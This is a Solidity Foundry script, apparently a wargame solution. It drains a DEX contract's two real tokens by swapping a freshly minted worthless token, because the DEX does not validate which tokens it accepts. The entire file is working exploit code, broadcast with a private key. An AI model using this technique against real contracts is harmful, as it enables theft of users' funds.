// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IDex {
    function swap(address, address , uint ) external;
    function token1() external returns(address);
    function token2() external returns(address);
    function balanceOf(address, address) external returns(uint);
    function approve(address, uint) external;
}
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ZombieToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("ZombieToken", "ZTN") public {
        _mint(msg.sender, initialSupply);
    }
}

contract DEX is Script {

    address DEX2 = 0x84a4390Fbb115262458d1ee979e0Ee0d3ced9D64;
    IDex toExploit = IDex(DEX2);

    function run() external{
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        vm.startBroadcast(deployerPrivateKey);
        toExploit.approve(address(toExploit), 500);
        
        ZombieToken yo = new ZombieToken(400);
        
        yo.transfer(DEX2, 100);
        
        yo.approve(DEX2, 300);

        address token1 = toExploit.token1();
        address token2 = toExploit.token2();
        
        toExploit.swap(address(yo), token1, 100);
        toExploit.swap(address(yo), token2, 200);
        
        console.log("Final token1 balance of Dex is : ", toExploit.balanceOf(token1, address(toExploit)));
        vm.stopBroadcast();
    }
}